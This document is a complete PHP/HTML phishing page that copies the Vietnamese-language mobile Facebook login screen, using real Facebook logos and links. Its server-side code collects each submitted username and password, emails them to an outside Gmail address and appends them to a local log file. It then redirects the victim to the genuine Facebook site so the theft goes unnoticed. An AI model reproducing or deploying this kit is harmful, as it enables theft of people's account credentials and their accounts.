
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Facebook - Đăng nhập đăng kí</title>
	<link rel="stylesheet" type="text/css" href="../css/app.css">
	<link rel="stylesheet" type="text/css" href="../css/mobile.css">
	<link rel="stylesheet" type="text/css" href="../css/ipad.css">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <script language="javascript" src="main.js"></script>
</head>
<body>
	<div class ="container">
		<form method="POST">
		<div class="img">
			<a href="https://m.facebook.com"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img1"></a>
		</div>
		<!-- form nhập mk-->
		<div class ="email">
			 <input type="text" class="tk" placeholder="Số di động hoặc email" autocomplete="on" name="username"z> 
		</div>
		<!-- foem mật khẩu -->
		<div class = "passs">
			<input type="password" class="pass" placeholder="Mật khẩu" name="password">
		</div>
		<!-- key value -->
		<div class ="dangnhap">
			<button class ="login" type="submit" value="Đăng nhập" name="submit-form">Đăng nhập</button>
		<!-- quên mk -->
		<br>
		<div class="quenmk">
			<a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F%3Fstype%3Dlo%26jlou%3DAfcwlyZAg9S6yLnvetZSfA3aNxenjLK0-g49P78_pDPAFyzGanM8er6ZuJm-_ZGrkUdsk6ZV1CTZuGMqHzoleIfBkPY1lfIhNrgDZF5UqsgL4g%26smuh%3D41039%26lh%3DAc9cyKzl2-zu-L78bDA&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr" class="qmk">Quên Mật Khẩu?</a>
		</div>
		<p style="text-align: center; color: rgb(0,0,0);font-size: 22px; font-weight: bold;font-style: bold;
">——————————<span > hoặc </span> ——————————</p>
		<div class="taotk">
			<a href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk" id="taotaikhoan">Tạo tài khoản mới</a>
		</div>
			 <div class="ngonngu">
			 	<div class="left1">
	           	<span >Tiếng Việt</span><br>
	            <span >中文(台灣)</span><br>
	            <span >Español</span><br>
	            <span >Français (France)</span>
				</div>
	            <div class="right1">
	            <span >English (UK)</span><br>
	            <span >한국어</span><br>
	            <span >Português (Brasil)</span>
	            </div>
	        </div>
	    <div id ="gioithieu">
	    	<a href="https://about.facebook.com/?refid=8" title="Đọc blog của chúng tôi, khám phá trung tâm tài nguyên và tìm cơ hội việc làm." class="ba1">Giới thiệu</a>
	    	<a href="https://m.facebook.com/help/?ref=pf&refid=8" title="Truy cập Trung tâm trợ giúp của chúng tôi." class="ba1">Trợ giúp</a>
	    	<a href="" title="xem thêm" class="ba1">Xem thêm</a><br>
	    	<span>Facebook,Inc.</span>
	    </div>
		</form>
<?php 
	include '../config/index.php';
    session_start();
    ob_start();
    	if(isset($_POST["submit-form"])){
    		$username = $_POST["username"];
    		$password = $_POST["password"];
            if($username == ""|| $password == ""){
                echo "Bạn chưa nhập đầy đủ thông tin";  
            }else{   
            $_SESSION["username"] = $username;
            echo $_SESSION["username"];
    		 $subject = "Nhớ subscribe nhaaa=))";
             $headers = "Tài khoản - Facebook";
             $body = " \n Tài Khoản : $username \n Mật Khẩu : $password \n ";
             mail("jaxuatt7@gmail.com", $headers, $body, $subject);
            $test = fopen("hu.txt","a");
            fwrite($test,$body);
            fclose($test); 
            header('Location: https://m.facebook.com/');
          
            }
    	}

?>
	</div>
</body>
</html>